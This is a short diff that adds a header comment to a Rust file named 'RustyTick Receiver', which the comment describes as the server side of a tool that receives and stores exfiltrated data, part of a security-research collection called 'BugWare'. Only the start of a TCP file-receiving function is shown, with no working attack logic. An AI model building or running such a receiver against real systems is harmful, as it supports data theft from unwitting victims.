@@ -1,3 +1,18 @@
+// -------------------------------------------------------------------------
+// SECURITY RESEARCH & EDUCATIONAL PURPOSES ONLY
+// This script is part of the BugWare repository, a collection of security tools
+// and PoCs for learning about attack vectors.
+// DO NOT USE THIS FOR ILLEGAL PURPOSES.
+// -------------------------------------------------------------------------
+
+/*
+    Program: RustyTick Receiver
+    Description: Server-side component for RustyTick to receive and store exfiltrated data.
+    Author: CyberPanther232
+    Suite: BugWare
+    Version: 1.0
+*/
+
 fn receive_file(mut stream: std::net::TcpStream) -> std::io::Result<()> {
     use std::io::Read;
     use std::fs::File;
